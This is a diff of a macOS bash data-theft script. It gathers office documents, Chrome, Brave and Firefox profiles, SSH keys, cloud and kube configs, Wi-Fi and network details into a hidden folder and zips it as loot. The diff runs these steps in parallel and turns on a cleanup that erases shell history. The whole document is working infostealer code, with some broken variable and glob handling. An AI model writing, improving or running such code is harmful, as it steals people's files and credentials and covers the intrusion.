@@ -11,11 +11,13 @@ if [ ! -d "$stor_dir" ] ; then
    mkdir -p "$stor_dir"
 fi
 
-loot_files() {
+exfil_files() {
   mkdir -p "$hidden_dir/files"
   for src_dir in ~/Desktop ~/Documents ~/Downloads; do
     find "$src_dir" -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/files/" \; &> /dev/null
   done
+  
+  loot_pid=$!
 }
 
 exfil_cloud() {
@@ -31,11 +33,14 @@ exfil_cloud() {
 }
 
 exfil_browsers() {
-    mkdir -p "$hidden_dir/browsers"
+  mkdir -p "$hidden_dir/browsers"
 
-    cp -r "$HOME/Library/Application Support/Google/Chrome" "$hidden_dir/browsers/" &>/dev/null
-    cp -r "$HOME/Library/Application Support/BraveSoftware/Brave-Browser" "$hidden_dir/browsers/" &>/dev/null
-    cp -r "$HOME/Library/Application Support/Firefox" "$hidden_dir/browsers/" &>/dev/null
+  cp -r "$HOME/Library/Application Support/Google/Chrome" "$hidden_dir/browsers/" &>/dev/null
+  cp -r "$HOME/Library/Application Support/BraveSoftware/Brave-Browser" "$hidden_dir/browsers/" &>/dev/null
+  cp -r "$HOME/Library/Application Support/Firefox" "$hidden_dir/browsers/" &>/dev/null
+
+  exfil_browser_pid=$!
+  
 }
 
 network_details() {
@@ -44,7 +49,7 @@ network_details() {
   ifconfig >> "$hidden_dir/network/ifconfig.txt"
   arp -a >> "$hidden_dir/network/arp.txt"
   networksetup -listpreferredwirelessnetworks en0 | awk 'NR>1 {print $1}' >> "$hidden_dir/network/saved_wifi_ssid.txt"
-  lsof -Pn -i4 | grep LISTEN >> $hidden_file/network/listening_ports.txt
+  lsof -Pn -i4 | grep LISTEN >> $hidden_dir/network/listening_ports.txt
 
   for ext_net in ip city region country loc org postal timezone; do
     echo " $ext_net - $(curl -s https://ipinfo.io/$ext_net)" >> "$hidden_dir/network/external_net"
@@ -52,7 +57,7 @@ network_details() {
 }
 
 exfil_bt() {
-  system_profiler SPBluetoothDataType >> $hidden_dir/network/bluetooth.txt
+  system_profiler SPBluetoothDataType >> "$hidden_dir/network/bluetooth.txt"
 }
 
 exfil_keys() {
@@ -71,19 +76,19 @@ exfil_apps() {
 
 exfil_config() {
   mkdir -p "$hidden_dir/configs"
-  config_files=( ".config"
+  config_files=( ".configi*"
                  ".bash*"
-                 ".vim*"
+                 "*vim*"
                  ".git"
-                 ".zsh*"
-                 "*.conf"
+                 "*.zsh*"
+                 "*.conf*"
                  "*.config"
-                 ".aws"
-                 ".kube"
+                 ".aws*"
+                 ".kube*"
                )
 
-  for files in "${config_files[@]}"; do
-    cp -qr ~/"$files" "$hidden_dir/configs/" &> /dev/null
+  for files in "~/${config_files[@]}"; do
+    cp -r $HOME/$files "$hidden_dir/configs/" &> /dev/null
   done
 }
 
@@ -91,6 +96,8 @@ exfil_compress() {
   mkdir -p "$stor_dir"
   cd "$stor_dir"
   zip -5 -r .l.oo.t.zip "$hidden_dir" 2>/dev/null &> /dev/null
+
+  compress_pid=$!
 }
 
 cleanup() {
@@ -99,16 +106,19 @@ cleanup() {
   echo > ~/.zsh_history
 }
 
-run() {
-  network_details
-  exfil_bt
-  exfil_keys
-  exfil_config
-  exfil_cloud
-  exfil_browsers
-  loot_files
-  exfil_compress
-  #cleanup
-}
 
-run
+exfil_files &
+exfil_cloud &
+exfil_browsers &
+exfil_config &
+
+network_details
+exfil_bt
+exfil_keys
+
+wait $exfil_files_pid $exfil_browsers_pid
+exfil_compress
+
+wait $exfil_compress
+cleanup
+
